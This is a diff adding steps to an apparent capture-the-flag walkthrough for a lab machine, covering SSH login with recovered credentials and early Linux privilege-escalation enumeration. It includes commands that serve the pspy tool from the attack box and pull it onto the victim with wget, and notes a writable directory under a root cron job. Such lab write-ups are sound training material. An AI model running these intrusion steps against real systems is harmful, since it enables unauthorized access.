@@ -81,7 +81,68 @@ unzip temp.zip
 <password>
 ```
 
+![image](https://user-images.githubusercontent.com/43767555/203447877-2fb0f021-cce0-4554-bd42-55ef4394cd2f.png)
+![image](https://user-images.githubusercontent.com/43767555/203447889-209d36d1-c1a6-4e88-8e9f-892d19423b55.png)
 
+This file contained what looks like user creds that we can try on the open SSH port.
+
+Back on the Attack machine, attempt to login to the.
+```
+ssh kinder@secdsm.thm
+<password>
+```
+
+![image](https://user-images.githubusercontent.com/43767555/203448008-5ecb6140-d47d-4a73-84c6-7ffdeab0f424.png)
+
+Here we can see the user.txt file, first flag down!
+
+![image](https://user-images.githubusercontent.com/43767555/203448073-aaf7cf10-878b-428f-9e19-0df367aa9904.png)
 
 # Privilege Escalation
 
+The next part comes with Linux Privesc enumeration but we need to look for Cron Jobs or follow the proccesses on the machine to see what's happeneing behind the scenes.
+
+On the attackbox get pspy downloaded from github.
+```
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+```
+
+From here we can host a temp pthon webservber to move it onto the victim machine.
+```
+sudo python3 -m http.server 80
+```
+
+![image](https://user-images.githubusercontent.com/43767555/203450435-ac957f3b-9332-422e-b93d-2fefde30d730.png)
+
+Download it onto the victim machine.
+```
+wget http://192.168.59.131/pspy64s && chmod 777 pspy64s
+```
+
+![image](https://user-images.githubusercontent.com/43767555/203450549-725b9440-c1fe-4192-888b-ea5ce0a8cbda.png)
+![image](https://user-images.githubusercontent.com/43767555/203450555-0e39858b-fbb9-4766-89f5-fe40d1b6c38f.png)
+
+This succesfully exposed a root cron job that we couldn't see from the public /etc/crontab file.
+
+![image](https://user-images.githubusercontent.com/43767555/203450599-59ec8156-ef63-4932-9c74-2ac168593ada.png)
+
+This shows some interest to this globally writeable directory inside of /opt/
+
+![image](https://user-images.githubusercontent.com/43767555/203450667-94dad0e8-3cbb-4ffc-a3e8-a6d7ff62b0c6.png)
+
+updog.py is not globally writeable though.
+
+I wonder what updog.py is?
+```
+whatis updog.py
+```
+
+![image](https://user-images.githubusercontent.com/43767555/203450755-e9cbb752-7951-4cdc-80f9-095713add631.png)
+
+Oh wait, wrong command!
+
+![image](https://user-images.githubusercontent.com/43767555/203450769-ef6eb46f-ea13-4040-83a8-2f2791c97cab.png)
+
+It looks like this script is checking if port 80 is online on localhost. If it isn't then it restarts the apache service.
+Pretty simple but on it's own not exploitable.
+What is exploitable is the writeable directory the file lives in.
